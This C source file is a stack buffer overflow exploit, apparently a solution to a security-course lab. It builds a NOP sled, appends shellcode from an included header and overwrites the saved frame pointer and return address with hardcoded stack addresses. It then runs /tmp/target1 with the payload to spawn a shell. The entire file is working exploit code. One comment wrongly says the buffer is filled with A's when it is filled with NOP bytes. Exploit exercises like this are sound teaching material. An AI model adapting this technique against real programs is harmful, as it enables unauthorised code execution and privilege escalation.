#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  char over[135 + strlen(shellcode) + 8];
  int i;
  int shell = strlen(shellcode) + 135;

  // Filling buf with A's
  for(i = 0; i < 135; i++){
    over[i] = '\x90';
  }

  // Adding Shellcode to buf
  for(i; i < shell; i++){
    over[i] = shellcode[i - 135];
  }

  // EBP ( Frame Pointer/ Base Pointer  - mains EBP, arg list)
  over[180] = '\xc8';
  over[181] = '\xfd';
  over[182] = '\xff';
  over[183] = '\xbf';
  
  // EBP+4 bytes = EIP (Return Address - points to buffer which includes the shell)  
  over[184] = '\x04';
  over[185] = '\xfd';
  over[186] = '\xff';
  over[187] = '\xbf';

  args[0] = TARGET; args[1] = over; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env)){
    fprintf(stderr, "execve failed.\n");
  }

  return 0;
}

